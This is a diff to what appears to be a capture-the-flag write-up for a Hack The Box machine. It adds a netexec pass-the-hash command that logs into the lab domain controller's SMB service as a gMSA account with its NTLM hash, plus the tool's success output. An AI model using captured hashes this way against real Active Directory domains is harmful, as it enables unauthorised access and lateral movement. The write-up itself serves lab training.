@@ -952,8 +952,14 @@ LDAP        10.129.244.72   389    DC01             Account: gMSA_CA_prod$      
 Ill grab the NTLM
 
 ```python
-
+nxc smb dc01.fries.htb -u 'gMSA_CA_prod$' -H '1be70aa7a632cd28036169c6038a92a5'  
+SMB         10.129.244.72   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:fries.htb) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.244.72   445    DC01             [+] fries.htb\gMSA_CA_prod$:1be70aa7a632cd28036169c6038a92a5
 ```
+
+This user is now compromised!
+
+This new user part of the remote management 
 
 
 
